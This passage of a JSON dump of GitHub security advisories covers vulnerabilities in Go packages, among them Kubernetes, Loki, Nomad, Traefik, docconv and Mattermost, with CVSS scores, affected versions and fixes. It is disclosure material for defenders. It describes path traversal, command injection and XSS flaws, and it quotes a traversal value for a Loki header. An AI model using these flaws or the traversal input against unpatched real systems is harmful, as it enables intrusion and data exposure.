"2022-12-31T03:30:26Z", "aliases": ["CVE-2022-48195"], "summary": "mellium.im/sasl authentication failure due to insufficient nonce randomness", "details": "An issue was discovered in Mellium mellium.im/sasl before 0.3.1. When performing SCRAM-based SASL authentication, if the remote end advertises support for channel binding, no random nonce is generated (instead, the nonce is empty). This causes authentication to fail in the best case, but (if paired with a remote end that does not validate the length of the nonce) could lead to insufficient randomness being used during authentication.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "mellium.im/sasl"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-48195"}, {"type": "PACKAGE", "url": "https://codeberg.org/mellium/sasl"}, {"type": "WEB", "url": "https://codeberg.org/mellium/sasl/commit/e6cbf681b247c4efa1477eaad2cc47a01707b732"}, {"type": "WEB", "url": "https://codeberg.org/mellium/sasl/releases/tag/v0.3.1"}, {"type": "WEB", "url": "https://mellium.im/cve/cve-2022-48195/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1268"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-04T13:56:47Z", "nvd_published_at": "2022-12-31T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r7hg-2cpp-8wqq", "modified": "2023-01-10T15:48:18Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4847"], "summary": "usememos/memos has Incorrectly Specified Destination in a Communication Channel", "details": "Incorrectly Specified Destination in a Communication Channel in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4847"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ff6d4b5a-5e75-4a14-b5ce-f318f8613b73"}], "database_specific": {"cwe_ids": ["CWE-941"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:52:48Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5rhg-xhgr-5hfj", "modified": "2023-01-10T15:58:16Z", "published": "2022-12-28T03:30:28Z", "aliases": ["CVE-2020-36563"], "summary": "go-saml's XML Digital Signatures use SHA-1", "details": "XML Digital Signatures generated and validated using this package use SHA-1, which may allow an attacker to craft inputs which cause hash collisions depending on their control over the input.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/RobotsAndPencils/go-saml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.0.0-20170520135329-fb13cb52a46b"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36563"}, {"type": "WEB", "url": "https://github.com/RobotsAndPencils/go-saml/pull/38"}, {"type": "PACKAGE", "url": "https://github.com/RobotsAndPencils/go-saml"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0047"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:48:02Z", "nvd_published_at": "2022-12-28T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4crw-w8pw-2hmf", "modified": "2022-12-12T20:44:49Z", "published": "2022-12-08T18:30:50Z", "aliases": ["CVE-2022-4122"], "summary": "Buildah (as part of Podman) vulnerable to Link Following", "details": "A vulnerability was found in buildah. Incorrect following of symlinks while reading .containerignore and .dockerignore results in information disclosure.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "4.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4122"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/16315"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2144983"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-08T23:39:14Z", "nvd_published_at": "2022-12-08T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-97rc-mm5j-f6rj", "modified": "2023-01-09T08:21:22Z", "published": "2022-12-27T15:30:19Z", "aliases": ["CVE-2022-4691"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4691"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c07b4a57caa89905e54b800f4d8fb720bbf5bf82"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/459b55c1-22f5-4556-9cda-9b86aa91582f"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:03:06Z", "nvd_published_at": "2022-12-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-32qh-8vg6-9g43", "modified": "2023-01-10T15:59:17Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2018-25046"], "summary": "Cloud Foundry Archiver vulnerable to path traversal", "details": "Due to improper path santization, archives containing relative file paths can cause files to be written (or overwritten) outside of the target directory.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudfoundry/archiver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180523222229-09b5706aa936"}]}]}, {"package": {"ecosystem": "Go", "name": "code.cloudfoundry.org/archiver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180523222229-09b5706aa936"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-25046"}, {"type": "WEB", "url": "https://github.com/cloudfoundry/archiver/commit/09b5706aa9367972c09144a450bb4523049ee840"}, {"type": "PACKAGE", "url": "https://github.com/cloudfoundry/archiver"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0025"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:15:54Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6m4h-hfpp-x8cx", "modified": "2022-12-30T17:06:17Z", "published": "2022-12-22T00:30:36Z", "aliases": ["CVE-2022-4643"], "summary": "docconv OS Command Injection vulnerability", "details": "A vulnerability was found in docconv prior to version 1.2.1. It has been declared as critical. This vulnerability affects the function ConvertPDFImages of the file pdf_ocr.go. The manipulation of the argument path leads to os command injection. The attack can be initiated remotely. Upgrading to version 1.2.1 can address this issue. The name of the patch is b19021ade3d0b71c89d35cb00eb9e589a121faa5. It is recommended to upgrade the affected component. VDB-216502 is the identifier assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sajari/docconv"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.1"}]}]}, {"package": {"ecosystem": "Go", "name": "code.sajari.com/docconv"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.3.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4643"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/pull/110"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/commit/b19021ade3d0b71c89d35cb00eb9e589a121faa5"}, {"type": "PACKAGE", "url": "https://github.com/sajari/docconv"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/releases/tag/v1.2.1"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/releases/tag/v1.3.5"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1184"}, {"type": "WEB", "url": "https://vuldb.com/?id.216502"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T17:06:17Z", "nvd_published_at": "2022-12-21T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gjcg-vrxg-xmgv", "modified": "2021-09-10T16:32:16Z", "published": "2021-09-10T17:54:01Z", "aliases": ["CVE-2021-39162"], "summary": "Incorrect handling of H2 GOAWAY + SETTINGS frames", "details": "Envoy, which Pomerium is based on, can abnormally terminate if an H/2 GOAWAY and SETTINGS frame are received in the same IO event.  \n\n### Impact\nThis can lead to a DoS in the presence of untrusted *upstream* servers.\n\n### Patches\n0.15.1 contains an upgraded envoy binary with this vulnerability patched.\n\n### Workarounds\nIf only trusted upstreams are configured, there is not substantial risk of this condition being triggered.\n\n### References\n[envoy GSA](https://github.com/envoyproxy/envoy/security/advisories/GHSA-j374-mjrw-vvp8)\n[envoy CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32780)\n[envoy announcement](https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [pomerium/pomerium](https://github.com/pomerium/pomerium/issues)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-j374-mjrw-vvp8"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-gjcg-vrxg-xmgv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39162"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}, {"type": "WEB", "url": "https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ"}], "database_specific": {"cwe_ids": ["CWE-754"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-10T16:32:16Z", "nvd_published_at": "2021-09-09T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cfc2-wjcm-c8fm", "modified": "2021-09-10T16:40:43Z", "published": "2021-09-10T17:54:25Z", "aliases": ["CVE-2021-39206"], "summary": "Incorrect Authorization with specially crafted requests", "details": "Envoy, which Pomerium is based on, contains two authorization related vulnerabilities:\n\n- [CVE-2021-32777](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32779): incorrectly transform a URL containing a `#fragment` element, causing a mismatch in path-prefix based authorization decisions.\n- [CVE-2021-32779](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32777): incorrectly handle duplicate headers, dropping all but the last.  This may lead to incorrect routing or authorization policy decisions.\n\n### Impact\nWith specially crafted requests, incorrect authorization or routing decisions may be made by Pomerium.\n\n### Patches\n\nPomerium v0.14.8 and v0.15.1 contain an upgraded envoy binary with these vulnerabilities patched.\n\n### Workarounds\n\n- This issue can only be triggered when using path prefix based policy.  Removing any such policies should provide mitigation.\n\n\n### References\n[envoy GSA CVE-2021-32777](https://github.com/envoyproxy/envoy/security/advisories/GHSA-r222-74fw-jqr9)\n[envoy GSA CVE-2021-32779](https://github.com/envoyproxy/envoy/security/advisories/GHSA-6g4j-5vrw-2m8h)\n[envoy announcement](https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [pomerium/pomerium](https://github.com/pomerium/pomerium/issues)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "0.14.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0"}, {"fixed": "0.15.1"}]}], "versions": ["0.15.0"]}], "references": [{"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-6g4j-5vrw-2m8h"}, {"type": "WEB", "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-r222-74fw-jqr9"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-cfc2-wjcm-c8fm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39206"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}, {"type": "WEB", "url": "https://groups.google.com/g/envoy-announce/c/5xBpsEZZDfE/m/wD05NZBbAgAJ"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-10T16:40:43Z", "nvd_published_at": "2021-09-09T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-74j8-88mm-7496", "modified": "2021-09-21T14:53:38Z", "published": "2021-09-21T18:28:21Z", "aliases": ["CVE-2020-8561"], "summary": "Confused Deputy in Kubernetes", "details": "A security issue was discovered in Kubernetes where actors that control the responses of MutatingWebhookConfiguration or ValidatingWebhookConfiguration requests are able to redirect kube-apiserver requests to private networks of the apiserver. If that user can view kube-apiserver logs when the log level is set to 10, they can view the redirected responses and headers in the logs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.22.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8561"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/104720"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/RV2IhwcrQsY"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211014-0002/"}], "database_specific": {"cwe_ids": ["CWE-441", "CWE-610"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-21T14:53:38Z", "nvd_published_at": "2021-09-20T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x6jv-5vfg-gm7x", "modified": "2023-04-24T19:05:13Z", "published": "2021-09-01T18:35:52Z", "aliases": ["CVE-2021-21501"], "summary": "Path traversal in ServiceCenter", "details": "Improper configuration will cause ServiceComb ServiceCenter Directory Traversal problem in ServcieCenter 1.x.x versions and fixed in 2.0.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/servicecomb-service-center"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21501"}, {"type": "WEB", "url": "https://github.com/apache/servicecomb-service-center/pull/788"}, {"type": "WEB", "url": "https://github.com/apache/servicecomb-service-center/commit/f4f44fe5d4a7e530ca8ee7c6f2c9e891ae8353c9"}, {"type": "PACKAGE", "url": "https://github.com/apache/servicecomb-service-center"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r337be65e504eac52a12e89d7de40345e5d335deee9dd7288f7f59b81%40%3Cdev.servicecomb.apache.org%3E"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/08/10/3"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-30T19:32:48Z", "nvd_published_at": "2021-08-10T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v9j4-cp63-qv62", "modified": "2021-08-30T21:24:59Z", "published": "2021-09-01T18:32:02Z", "aliases": ["CVE-2021-38197"], "summary": "Tarslip in go-unarr", "details": "unarr.go in go-unarr (aka Go bindings for unarr) 0.1.1 allows Directory Traversal via ../ in a pathname within a TAR archive.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gen2brain/go-unarr"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-38197"}, {"type": "WEB", "url": "https://github.com/gen2brain/go-unarr/issues/21"}, {"type": "WEB", "url": "https://github.com/gen2brain/go-unarr/commit/239ec404d348280b50bbf671327709e8857fc5f4"}, {"type": "WEB", "url": "https://github.com/gen2brain/go-unarr/releases/tag/v0.1.4"}, {"type": "PACKAGE", "url": "github.com/gen2brain/go-unarr"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-08-30T21:24:59Z", "nvd_published_at": "2021-08-08T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vw47-mr44-3jf9", "modified": "2021-09-21T14:54:49Z", "published": "2021-09-21T18:28:30Z", "aliases": ["CVE-2021-25740"], "summary": "Confused Deputy in Kubernetes", "details": "A security issue was discovered with Kubernetes that could enable users to send network traffic to locations they would otherwise not have access to via a confused deputy attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.22.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25740"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/103675"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/WYE9ptrhSLE"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211014-0001/"}], "database_specific": {"cwe_ids": ["CWE-441", "CWE-610"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-09-21T14:54:49Z", "nvd_published_at": "2021-09-20T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-grj5-8x6q-hc9q", "modified": "2021-09-08T18:11:29Z", "published": "2021-09-02T22:00:40Z", "aliases": ["CVE-2021-36156"], "summary": "Path traversal in Grafana Loki", "details": "An issue was discovered in Grafana Loki through 2.2.1. The header value X-Scope-OrgID is used to construct file paths for rules files, and if crafted to conduct directory traversal such as ae ../../sensitive/path/in/deployment pathname, then Loki will attempt to parse a rules file at that location and include some of the contents in the error message.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/loki"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36156"}, {"type": "WEB", "url": "https://github.com/grafana/loki/pull/4020"}, {"type": "WEB", "url": "https://github.com/grafana/loki/pull/4020#issue-694377133"}, {"type": "PACKAGE", "url": "https://github.com/grafana/loki"}, {"type": "WEB", "url": "https://github.com/grafana/loki/releases/tag/v2.3.0"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-08-04T18:52:20Z", "nvd_published_at": "2021-08-03T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q9mp-79cp-9g8j", "modified": "2021-08-02T22:18:22Z", "published": "2021-09-02T22:00:09Z", "aliases": ["CVE-2019-20894"], "summary": "Improper Authentication", "details": "Traefik 2.x, in certain configurations, allows HTTPS sessions to proceed without mutual TLS verification in a situation where ERR_BAD_SSL_CLIENT_AUTH_CERT should have occurred.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-20894"}, {"type": "WEB", "url": "https://github.com/containous/traefik/issues/5312"}, {"type": "WEB", "url": "https://github.com/containous/traefik/pull/7008"}, {"type": "WEB", "url": "https://github.com/containous/traefik/commit/2b353971696717e980521b0e4baa1eba66c8d2bf"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-08-02T22:18:22Z", "nvd_published_at": "2020-07-02T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vrxp-mg9f-hwf3", "modified": "2021-09-21T21:51:18Z", "published": "2021-09-22T20:37:09Z", "aliases": ["CVE-2021-41087"], "summary": "Improperly Implemented path matching for in-toto-golang", "details": "### Impact\nAuthenticated attackers posing as functionaries (i.e., within a trusted set of users for a layout) are able to create attestations that may bypass DISALLOW rules in the same layout. An attacker with access to trusted private keys, may issue an attestation that contains a disallowed artifact by including path traversal semantics (e.g., foo vs dir/../foo).\n\n### Patches\nThe problem has been fixed in version 0.3.0.\n\n### Workarounds\nExploiting this vulnerability is dependent on the specific policy applied.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [in-toto-golang](http://github.com/in-toto/in-toto-golang)\n* Email us at [in-toto-public](mailto:in-toto-public@googlegroups.com)\n* If this is a sensitive security-relevant disclosure, please send a PGP encrypted email to santiagotorres@purdue.edu or jcappos@nyu.edu\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/in-toto/in-toto-golang"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.0"}}], "references": [{"type": "WEB", "url": "https://github.com/in-toto/in-toto-golang/security/advisories/GHSA-vrxp-mg9f-hwf3"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41087"}, {"type": "WEB", "url": "https://github.com/in-toto/in-toto-golang/commit/f2c57d1e0f15e3ffbeac531829c696b72ecc4290"}, {"type": "PACKAGE", "url": "https://github.com/in-toto/in-toto-golang"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-345"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-21T21:51:18Z", "nvd_published_at": "2021-09-21T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c77f-4rgj-jfr4", "modified": "2023-12-07T23:44:35Z", "published": "2021-09-15T20:23:28Z", "aliases": ["CVE-2021-39391"], "summary": "Cross-site Scripting in Beego", "details": "Cross Site Scripting (XSS) vulnerability exists in the admin panel in Beego v2.0.1 via the URI path in an HTTP request, which is activated by administrators viewing the \"Request Statistics\" page.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-39391"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/4727"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}], "database_specific": {"cwe_ids": ["CWE-64", "CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-15T18:12:59Z", "nvd_published_at": "2021-09-14T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c8x3-rg72-fwwg", "modified": "2021-09-14T18:46:53Z", "published": "2021-09-08T20:14:38Z", "aliases": ["CVE-2021-37218"], "summary": "Privilege escalation in Hashicorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise Raft RPC layer allows non-server agents with a valid certificate signed by the same CA to access server-only functionality, enabling privilege escalation. Fixed in 1.0.10 and 1.1.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.1.0"}, {"fixed": "1.1.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37218"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-21-nomad-raft-rpc-privilege-escalation/29023"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-09-08T18:12:37Z", "nvd_published_at": "2021-09-07T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hv5f-73mr-7vvj", "modified": "2021-10-06T13:08:14Z", "published": "2021-09-23T23:11:06Z", "aliases": ["CVE-2021-37860"], "summary": "Cross-site Scripting in Mattermost", "details": "Mattermost 5.38 and earlier fails to sufficiently sanitize clipboard contents, which allows a user-assisted attacker to inject arbitrary web script in product deployments that explicitly disable the default CSP.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.39.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37860"}, {"type": "WEB", "url": "https://docs.mattermost.com/install/self-managed-changelog.html#release-v5-39-quality-release"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server/"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-09-23T16:23:33Z", "nvd_published_at": "2021-09-22T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mfv7-gq43-w965", "modified": "2021-09-14T18:47:27Z", "published": "2021-09-07T23:09:24Z", "aliases": ["CVE-2021-25737"], "summary": "Incomplete List of Disallowed Inputs in Kubernetes", "details": "A security issue was discovered in Kubernetes where a user may be able to redirect pod traffic to private networks on a Node. Kubernetes already prevents creation of Endpoint IPs in the localhost or link-local range, but the same validation was not performed on EndpointSlice IPs.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": 